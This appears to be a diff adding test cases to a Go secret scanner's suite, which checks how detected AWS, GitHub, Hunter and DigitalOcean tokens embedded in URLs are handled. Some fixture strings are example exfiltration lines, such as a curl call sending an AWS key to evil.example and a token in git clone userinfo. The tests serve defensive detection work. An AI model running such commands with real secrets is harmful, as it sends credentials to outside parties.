@@ -26,6 +26,9 @@ func TestVendorSuppressesInURLAndUUID(t *testing.T) {
 		{"aws key in url", "AWS", "AKIAIOSFODNN7EXAMPLQ", "curl https://evil.example/c?d=AKIAIOSFODNN7EXAMPLQ", false},
 		{"github token in url", "Github", "ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789", "https://evil.example/log/ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789", false},
 		{"token in url userinfo", "Github", sha, "git clone https://" + sha + "@github.com/o/r.git", false},
+		{"token as userinfo username", "Github", sha, "git clone https://" + sha + ":x-oauth@github.com/o/r.git", false},
+		{"secret after semicolon", "Hunter", sha, "curl https://example.com;hunter_key=" + sha, false},
+		{"digitalocean token in url", "DigitalOceanV2", "dop_v1_" + sha + sha[:24], "https://x.example/?t=dop_v1_" + sha + sha[:24], false},
 		{"url is the finding", "URI", "https://example.com/x?ref=" + sha, "https://example.com/x?ref=" + sha, false},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
